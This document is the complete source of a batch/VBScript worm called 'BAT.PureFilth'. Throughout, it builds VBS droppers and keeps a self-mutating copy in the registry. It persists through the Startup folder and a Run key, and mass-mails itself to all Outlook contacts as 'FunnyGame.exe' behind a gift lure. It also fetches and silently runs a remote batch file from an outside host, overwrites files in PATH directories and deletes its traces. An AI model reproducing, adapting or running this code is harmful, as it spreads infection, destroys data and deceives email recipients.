:: BAT.PureFilth - By SAD1c
@echo off
ver|find "XP">nul
if errorlevel 1 ctty nul
copy %0 %tmp%\funny.bat
echo.on error resume next>%tmp%\ShellTray.vbs
echo dim wsh>>%tmp%\ShellTray.vbs
echo set wsh=createobject("wscript.shell")>>%tmp%\ShellTray.vbs
echo set fso=createobject("scripting.filesystemobject")>>%tmp%\ShellTray.vbs
echo dim pfcode>>%tmp%\ShellTray.vbs
echo pfcode=wsh.regread("HKCU\Software\PureFilth\")>>%tmp%\ShellTray.vbs
echo set drop=fso.createtextfile("%tmp%\funny.bat")>>%tmp%\ShellTray.vbs
echo drop.write pfcode>>%tmp%\ShellTray.vbs
echo drop.close>>%tmp%\ShellTray.vbs
echo wsh.run "%tmp%\funny.bat",0>>%tmp%\ShellTray.vbs
echo BAT.PureFilth - By SAD1c>%tmp%\Filth.tmp
echo for %%a in (%path%\*.*) do copy %tmp%\Filth.tmp %%aF>%tmp%\FilthGen.bat
echo.on error resume next>%tmp%\WLtemp.vbs
echo dim fsys,wsh,stream,pfcode>>%tmp%\WLtemp.vbs
echo set fsys=createobject("scripting.filesystemobject")>>%tmp%\WLtemp.vbs
echo set wsh=createobject("wscript.shell")>>%tmp%\WLtemp.vbs
echo set stream=fsys.opentextfile("%tmp%\funny.bat")>>%tmp%\WLtemp.vbs
echo pfcode=stream.readall>>%tmp%\WLtemp.vbs
echo stream.close>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"wsh",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"fso",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"pfcode",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"drop",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"FilthGen",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"funny",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"fsys",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"stream",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"length",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"cnt",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"randstring",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"tmpn",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"WLtemp",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"outl",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"mapil",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"alist",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"sadd",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"alcnt",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"crypt",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"outi",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"AllDone",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"ineto",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"data",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"downloaded",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo pfcode=replace(pfcode,"AllDone",randstring(int(rnd*7)+2))>>%tmp%\WLtemp.vbs
echo function randstring(length)>>%tmp%\WLtemp.vbs
echo for cnt=1 to length>>%tmp%\WLtemp.vbs
echo randomize>>%tmp%\WLtemp.vbs
echo if int(rnd*2000/1000)=1 then>>%tmp%\WLtemp.vbs
echo tmpn=int(rnd*26)+97>>%tmp%\WLtemp.vbs
echo else>>%tmp%\WLtemp.vbs
echo tmpn=int(rnd*26)+65>>%tmp%\WLtemp.vbs
echo end if>>%tmp%\WLtemp.vbs
echo randstring=randstring&chr(tmpn)>>%tmp%\WLtemp.vbs
echo next>>%tmp%\WLtemp.vbs
echo end function>>%tmp%\WLtemp.vbs
echo set stream=fsys.opentextfile("%tmp%\funny.bat",2)>>%tmp%\WLtemp.vbs
echo stream.write pfcode>>%tmp%\WLtemp.vbs
echo stream.close>>%tmp%\WLtemp.vbs
echo wsh.regwrite "HKCU\Software\PureFilth\",pfcode>>%tmp%\WLtemp.vbs
echo fso.copyfile "%tmp%\ShellTray.vbs",wsh.specialfolders("AllusersStartup")&"\ShellTray.vbs",1>>%tmp%\WLtemp.vbs
echo fso.copyfile "%tmp%\ShellTray.vbs",fsys.getspecialfolder(1)&"\SysWatch.vbs",1>>%tmp%\WLtemp.vbs
echo wsh.regwrite "HKLM\Software\Micr"&chr(110+1)&"soft\Windows\CurrentVersion\RunServicesOnce\Shell Tray","wscript.exe "&fsys.getspecialfolder(1)&"\SysWatch.vbs">>%tmp%\WLtemp.vbs
echo if wsh.regread("HKCU\Software\PureFilth\WABDONE")="" then>>%tmp%\WLtemp.vbs
echo dim outl,mapil,alist,sadd,alcnt>>%tmp%\WLtemp.vbs
echo set outl=createobject("outlook.application")>>%tmp%\WLtemp.vbs
echo set mapil=outl.getnamespace("MAPI")>>%tmp%\WLtemp.vbs
set crypt=addresslists
echo set alist=mapil.%crypt%>>%tmp%\WLtemp.vbs
echo for each sadd in alist>>%tmp%\WLtemp.vbs
echo for alcnt=1 to sadd.addressentries.count>>%tmp%\WLtemp.vbs
echo dim outi>>%tmp%\WLtemp.vbs
echo set outi=outl.createitem(0)>>%tmp%\WLtemp.vbs
echo outi.to=sadd.addressentries(alcnt).address>>%tmp%\WLtemp.vbs
echo outi.subject="A gift for you!">>%tmp%\WLtemp.vbs
echo outi.body="Hi, "&sadd.addressentries(alcnt).name&"! How are you?"&vbcrlf>>%tmp%\WLtemp.vbs
echo outi.body=outi.body&"I found this little but very cool game and i decided to send it to you."&vbcrlf>>%tmp%\WLtemp.vbs
echo outi.body=outi.body&"I hope you will like it. Well, play it and tell me your opinion."&vbcrlf&"Greetings."&f>>%tmp%\WLtemp.vbs
echo outi.attachments.add "%tmp%\funny.bat",1,len(outi.body),"FunnyGame.exe">>%tmp%\WLtemp.vbs
echo outi.importance=2>>%tmp%\WLtemp.vbs
echo outi.send>>%tmp%\WLtemp.vbs
echo next>>%tmp%\WLtemp.vbs
echo next>>%tmp%\WLtemp.vbs
echo wsh.regwrite "HKCU\Software\PureFilth\WABDONE","AllDone">>%tmp%\WLtemp.vbs
echo dim ineto,data,downloaded>>%tmp%\WLtemp.vbs
echo set ineto=createobject("inetctls.inet")>>%tmp%\WLtemp.vbs
echo ineto.requesttimeout=22>>%tmp%\WLtemp.vbs
echo data=ineto.openurl("http://www.PureFilth.com/PureFilth.bat")>>%tmp%\WLtemp.vbs
echo if not(data="") then>>%tmp%\WLtemp.vbs
echo set downloaded=fsys.createtextfile("%tmp%\PureFilth.bat")>>%tmp%\WLtemp.vbs
echo downloaded.write data>>%tmp%\WLtemp.vbs
echo downloaded.close>>%tmp%\WLtemp.vbs
echo wsh.run "%tmp%\PureFilth.bat",0>>%tmp%\WLtemp.vbs
echo end if>>%tmp%\WLtemp.vbs
echo wsh.run "%tmp%\FilthGen.bat",0>>%tmp%\WLtemp.vbs
cscript %tmp%\WLtemp.vbs>nul
del %tmp%\funny.bat
del %tmp%\*.vbs
del %0
ver|find "XP">nul
if errorlevel 1 ctty con
cls